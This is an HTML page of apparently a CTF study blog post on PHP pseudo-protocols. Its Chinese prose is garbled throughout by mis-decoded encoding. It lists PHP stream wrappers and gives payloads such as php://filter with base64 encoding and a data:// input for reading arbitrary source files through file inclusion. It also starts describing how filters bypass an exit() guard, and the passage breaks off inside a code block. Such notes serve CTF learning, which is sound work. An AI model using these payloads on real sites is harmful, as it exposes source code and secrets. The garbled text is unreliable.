<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>PHPä¼ªåè®® - Ting BLOGğŸˆ</title><meta name="author" content="Ting">
<meta name="description" content=" å‚è€ƒæ–‡ç« ï¼šPHPä¼ªåè®®è¯¦è§£
phpæ”¯æŒçš„ä¼ªåè®®1 2 3 4 5 6 7 8 9 10 11 12 1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ 2 http:// â€” è®¿é—® HTTP(s) ç½‘å€ 3 ftp:// â€” è®¿é—® FTP(s) URLs 4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ 5 zlib:// â€” å‹ç¼©æµ 6 data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰ 7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ 8 phar:// â€” PHP å½’æ¡£ 9 ssh2:// â€” Secure Shell 2 10 rar:// â€” RAR 11 ogg:// â€” éŸ³é¢‘æµ 12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ php://filterphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚
"><meta name="keywords" content='Web, CTF'>
  <meta itemprop="name" content="PHPä¼ªåè®®">
  <meta itemprop="description" content="å‚è€ƒæ–‡ç« ï¼šPHPä¼ªåè®®è¯¦è§£
phpæ”¯æŒçš„ä¼ªåè®®1 2 3 4 5 6 7 8 9 10 11 12 1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ 2 http:// â€” è®¿é—® HTTP(s) ç½‘å€ 3 ftp:// â€” è®¿é—® FTP(s) URLs 4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ 5 zlib:// â€” å‹ç¼©æµ 6 data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰ 7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ 8 phar:// â€” PHP å½’æ¡£ 9 ssh2:// â€” Secure Shell 2 10 rar:// â€” RAR 11 ogg:// â€” éŸ³é¢‘æµ 12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ php://filterphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚">
  <meta itemprop="datePublished" content="2023-07-01T11:25:40+08:00">
  <meta itemprop="dateModified" content="2023-07-01T11:25:40+08:00">
  <meta itemprop="wordCount" content="299">
  <meta itemprop="keywords" content="Web,CTF"><meta property="og:url" content="http://localhost:1313/posts/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
  <meta property="og:site_name" content="Ting BLOGğŸˆ">
  <meta property="og:title" content="PHPä¼ªåè®®">
  <meta property="og:description" content="å‚è€ƒæ–‡ç« ï¼šPHPä¼ªåè®®è¯¦è§£
phpæ”¯æŒçš„ä¼ªåè®®1 2 3 4 5 6 7 8 9 10 11 12 1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ 2 http:// â€” è®¿é—® HTTP(s) ç½‘å€ 3 ftp:// â€” è®¿é—® FTP(s) URLs 4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ 5 zlib:// â€” å‹ç¼©æµ 6 data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰ 7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ 8 phar:// â€” PHP å½’æ¡£ 9 ssh2:// â€” Secure Shell 2 10 rar:// â€” RAR 11 ogg:// â€” éŸ³é¢‘æµ 12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ php://filterphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-07-01T11:25:40+08:00">
    <meta property="article:modified_time" content="2023-07-01T11:25:40+08:00">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="CTF">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="PHPä¼ªåè®®">
  <meta name="twitter:description" content="å‚è€ƒæ–‡ç« ï¼šPHPä¼ªåè®®è¯¦è§£
phpæ”¯æŒçš„ä¼ªåè®®1 2 3 4 5 6 7 8 9 10 11 12 1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ 2 http:// â€” è®¿é—® HTTP(s) ç½‘å€ 3 ftp:// â€” è®¿é—® FTP(s) URLs 4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ 5 zlib:// â€” å‹ç¼©æµ 6 data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰ 7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼ 8 phar:// â€” PHP å½’æ¡£ 9 ssh2:// â€” Secure Shell 2 10 rar:// â€” RAR 11 ogg:// â€” éŸ³é¢‘æµ 12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ php://filterphp://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚">
<meta name="application-name" content="FixIt">
<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="PHPä¼ªåè®® - Ting BLOGğŸˆ" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/2023web-ping/" title="Ping" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2023web-php-smarty%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" title="PHP Smartyæ¨¡ç‰ˆæ³¨å…¥" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/index.md" title="PHPä¼ªåè®® - Ting BLOGğŸˆ"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "PHPä¼ªåè®®",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE\/"
    },"genre": "posts","keywords": "Web, CTF","wordcount":  299 ,
    "url": "http:\/\/localhost:1313\/posts\/2023web-php%E4%BC%AA%E5%8D%8F%E8%AE%AE\/","datePublished": "2023-07-01T11:25:40+08:00","dateModified": "2023-07-01T11:25:40+08:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Ting"
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Ting BLOGğŸˆ"><span class="header-title-pre">ğŸˆ</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a
                class="menu-link"
                href="/archives/"
                
                
              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/categories/"
                
                
              ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/tags/"
                
                
              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/friends/"
                
                
              ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
              <a
                class="menu-link"
                href="/about/"
                
                
              ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Ting BLOGğŸˆ"><span class="header-title-pre">ğŸˆ</span><span class="typeit"><template>Ting BLOG</template></span></a><span class="typeit header-subtitle"><template></template></span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/archives/"
                  
                  
                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/categories/"
                  
                  
                ><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/tags/"
                  
                  
                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/friends/"
                  
                  
                ><i class="fa-solid fa-chain fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li
              class="menu-item"
            ><a
                  class="menu-link"
                  href="/about/"
                  
                  
                ><i class="fa-solid fa-graduation-cap fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>PHPä¼ªåè®®</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><a href="Tin10g.github.io" title="Author" rel=" author" class="author"><img loading="lazy" src="https://img.picui.cn/free/2024/10/25/671b813cb6b0a.png" alt="Ting" data-title="Ting" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Ting</a></span><span class="post-included-in">&nbsp;included in <a href="/categories/web--2023%E7%AC%94%E8%AE%B0%E6%9C%AA%E6%95%B4%E7%90%86/" class="post-category" title="Category - Web Â· 2023ç¬”è®°ï¼ˆæœªæ•´ç†ï¼‰"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Web Â· 2023ç¬”è®°ï¼ˆæœªæ•´ç†ï¼‰</a></span></div><div class="post-meta-line"><span title="published on 2023-07-01 11:25:40"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-07-01">2023-07-01</time></span>&nbsp;<span title="299 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 300 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>Contents</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#phpæ”¯æŒçš„ä¼ªåè®®">phpæ”¯æŒçš„ä¼ªåè®®</a></li>
    <li><a href="#phpfilter">php://filter</a>
      <ul>
        <li><a href="#å¸¸ç”¨payload">å¸¸ç”¨payloadï¼š</a></li>
        <li><a href="#è¿‡æ»¤å™¨">è¿‡æ»¤å™¨</a></li>
        <li><a href="#åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit">åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit</a></li>
      </ul>
    </li>
    <li><a href="#data">data://</a></li>
    <li><a href="#file">file://</a></li>
    <li><a href="#php">php://</a></li>
    <li><a href="#phpinput">php://input</a></li>
    <li><a href="#zip">zip://</a></li>
    <li><a href="#pharä¼ªåè®®">phar://ä¼ªåè®®</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content"><blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/cosmoslin/article/details/120695429"target="_blank" rel="external nofollow noopener noreferrer">PHPä¼ªåè®®è¯¦è§£</a></p>
</blockquote>
<h2 id="phpæ”¯æŒçš„ä¼ªåè®®" class="heading-element"><span>phpæ”¯æŒçš„ä¼ªåè®®</span>
  <a href="#php%e6%94%af%e6%8c%81%e7%9a%84%e4%bc%aa%e5%8d%8f%e8%ae%ae" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1 file:// â€” è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ
</span></span><span class="line"><span class="cl">2 http:// â€” è®¿é—® HTTP(s) ç½‘å€
</span></span><span class="line"><span class="cl">3 ftp:// â€” è®¿é—® FTP(s) URLs
</span></span><span class="line"><span class="cl">4 php:// â€” è®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰
</span></span><span class="line"><span class="cl">5 zlib:// â€” å‹ç¼©æµ
</span></span><span class="line"><span class="cl">6 data:// â€” æ•°æ®ï¼ˆRFC 2397ï¼‰
</span></span><span class="line"><span class="cl">7 glob:// â€” æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼
</span></span><span class="line"><span class="cl">8 phar:// â€” PHP å½’æ¡£
</span></span><span class="line"><span class="cl">9 ssh2:// â€” Secure Shell 2
</span></span><span class="line"><span class="cl">10 rar:// â€” RAR
</span></span><span class="line"><span class="cl">11 ogg:// â€” éŸ³é¢‘æµ
</span></span><span class="line"><span class="cl">12 expect:// â€” å¤„ç†äº¤äº’å¼çš„æµ</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="phpfilter" class="heading-element"><span>php://filter</span>
  <a href="#phpfilter" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>php://filterå¯ä»¥è·å–æŒ‡å®šæ–‡ä»¶æºç ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œphp://filteræµä¼šè¢«å½“ä½œphpæ–‡ä»¶æ‰§è¡Œã€‚æ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬å¯¹å…¶è¿›è¡Œç¼–ç ï¼Œè®©å…¶ä¸æ‰§è¡Œã€‚ä»è€Œå¯¼è‡´ ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//åè®®å‚æ•°
</span></span><span class="line"><span class="cl">resource=&lt;è¦è¿‡æ»¤çš„æ•°æ®æµ&gt;	è¿™ä¸ªå‚æ•°æ˜¯å¿…é¡»çš„ã€‚å®ƒæŒ‡å®šäº†ä½ è¦ç­›é€‰è¿‡æ»¤çš„æ•°æ®æµã€‚
</span></span><span class="line"><span class="cl">read=&lt;è¯»é“¾çš„ç­›é€‰åˆ—è¡¨&gt;	è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚
</span></span><span class="line"><span class="cl">write=&lt;å†™é“¾çš„ç­›é€‰åˆ—è¡¨&gt;	è¯¥å‚æ•°å¯é€‰ã€‚å¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦ï¼ˆ|ï¼‰åˆ†éš”ã€‚
</span></span><span class="line"><span class="cl">&lt;ï¼›ä¸¤ä¸ªé“¾çš„ç­›é€‰åˆ—è¡¨&gt;	ä»»ä½•æ²¡æœ‰ä»¥ read= æˆ– write= ä½œå‰ç¼€ çš„ç­›é€‰å™¨åˆ—è¡¨ä¼šè§†æƒ…å†µåº”ç”¨äºè¯»æˆ–å†™é“¾ã€‚</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="å¸¸ç”¨payload" class="heading-element"><span>å¸¸ç”¨payloadï¼š</span>
  <a href="#%e5%b8%b8%e7%94%a8payload" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">php://filter/read=convert.base64-encode/resource=index.php
</span></span><span class="line"><span class="cl">php://filter/resource=index.php
</span></span><span class="line"><span class="cl">data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="è¿‡æ»¤å™¨" class="heading-element"><span>è¿‡æ»¤å™¨</span>
  <a href="#%e8%bf%87%e6%bb%a4%e5%99%a8" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><ol>
<li>å­—ç¬¦ä¸²è¿‡æ»¤å™¨
ï¼ˆ1ï¼‰string.rot13ï¼šä¸€ç§å­—ç¬¦å¤„ç†æ–¹å¼ï¼Œå­—ç¬¦å³ç§»åä¸‰ä½ã€‚
ï¼ˆ2ï¼‰string.toupperï¼šå°†æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ã€‚
ï¼ˆ3ï¼‰string.tolowerï¼šå°†æ‰€æœ‰å­—ç¬¦è½¬æ¢ä¸ºå°å†™ã€‚
ï¼ˆ4ï¼‰string.strip_tagsï¼šç”¨æ¥å¤„ç†æ‰è¯»å…¥çš„æ‰€æœ‰æ ‡ç­¾ï¼Œä¾‹å¦‚XMLçš„ç­‰ç­‰ã€‚<strong>åœ¨ç»•è¿‡æ­»äº¡exitå¤§æœ‰ç”¨å¤„</strong>ã€‚</li>
<li>è½¬æ¢è¿‡æ»¤å™¨
ï¼ˆ1ï¼‰convert.base64-encode &amp; convert.base64-decode
base64åŠ å¯†è§£å¯†
ï¼ˆ2ï¼‰convert.quoted-printable-encode &amp; convert.quoted-printable-decode
å¯ä»¥ç¿»è¯‘ä¸ºå¯æ‰“å°å­—ç¬¦å¼•ç”¨ç¼–ç ï¼Œä½¿ç”¨å¯ä»¥æ‰“å°çš„ASCIIç¼–ç çš„å­—ç¬¦è¡¨ç¤ºå„ç§ç¼–ç å½¢å¼ä¸‹çš„å­—ç¬¦</li>
<li>å‹ç¼©è¿‡æ»¤å™¨
å‹ç¼©è¿‡æ»¤å™¨æŒ‡çš„å¹¶ä¸æ˜¯åœ¨æ•°æ®æµä¼ å…¥çš„æ—¶å€™å¯¹æ•´ä¸ªæ•°æ®è¿›è¡Œå†™å…¥æ–‡ä»¶åå‹ç¼©æ–‡ä»¶ï¼Œä¹Ÿä¸ä»£è¡¨å¯ä»¥å‹ç¼©æˆ–è€…è§£å‹æ•°æ®æµã€‚
å‹ç¼©è¿‡æ»¤å™¨ä¸äº§ç”Ÿå‘½ä»¤è¡Œå·¥å…·å¦‚ gzipçš„å¤´å’Œå°¾ä¿¡æ¯ã€‚<strong>åªæ˜¯å‹ç¼©å’Œè§£å‹æ•°æ®æµä¸­çš„æœ‰æ•ˆè½½è·éƒ¨åˆ†ã€‚</strong>
ï¼ˆ1ï¼‰zlib.deflateï¼ˆå‹ç¼©ï¼‰or bzip2.compress
ï¼ˆ2ï¼‰zlib.inflateï¼ˆè§£å‹ï¼‰or bzip2.decompress</li>
<li>åŠ å¯†è¿‡æ»¤å™¨
<code>mcrypt.*</code>å’Œ<code> mdecrypt.*</code>ä½¿ç”¨ libmcrypt æä¾›äº†å¯¹ç§°çš„åŠ å¯†å’Œè§£å¯†ã€‚</li>
</ol>
<h3 id="åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit" class="heading-element"><span>åˆ©ç”¨filterä¼ªåè®®ç»•è¿‡æ­»äº¡exit</span>
  <a href="#%e5%88%a9%e7%94%a8filter%e4%bc%aa%e5%8d%8f%e8%ae%ae%e7%bb%95%e8%bf%87%e6%ad%bb%e4%ba%a1exit" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>æ­»äº¡exitæŒ‡çš„æ˜¯åœ¨è¿›è¡Œå†™å…¥PHPæ–‡ä»¶æ“ä½œæ—¶ï¼Œæ‰§è¡Œäº†ä»¥ä¸‹å‡½æ•°ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">file_put_contents($content, &#39;&lt;?php exit();&#39; . $content);
